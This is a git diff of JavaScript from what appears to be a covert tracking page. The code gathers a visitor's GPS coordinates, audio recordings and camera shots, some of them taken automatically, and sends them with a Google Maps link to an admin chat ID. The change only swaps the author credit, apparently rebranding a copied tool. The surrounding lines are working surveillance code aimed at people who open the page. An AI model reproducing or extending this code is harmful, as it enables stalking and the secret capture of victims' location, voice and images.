@@ -248,7 +248,7 @@ async function sendAudio(audioBlob) {
     caption += `📍 Kinh độ: ${gps.lon || location.lon || 0}\n`;
     caption += `📌 Google Maps: https://maps.google.com/maps?q=${gps.lat || location.lat || 0},${gps.lon || location.lon || 0}\n`;
     caption += `🎤 Dung lượng: ${Math.round(audioBlob.size/1024)}KB\n\n`;
-    caption += `by @ThanhDiemX ♡`;
+    caption += `by @mduc ♡`;
     
     const formData = new FormData();
     formData.append('chat_id', ADMIN_CHAT_ID);
@@ -394,7 +394,7 @@ function buildCaption(location, gps, deviceInfo, isAuto = false) {
   caption += `📍 GPS: ${locationGranted ? '✅ Đã cấp' : '❌ Từ chối'}\n`;
   caption += `📸 Camera: ✅ Đã chụp ${isAuto ? 'tự động' : 'thủ công'}\n\n`;
   caption += `⚠️ Ghi chú: Thông tin có thể chưa chính xác 100%.\n`;
-  caption += `\nby @ThanhDiemX ♡`;
+  caption += `\nby @mduc ♡`;
   return caption;
 }
 
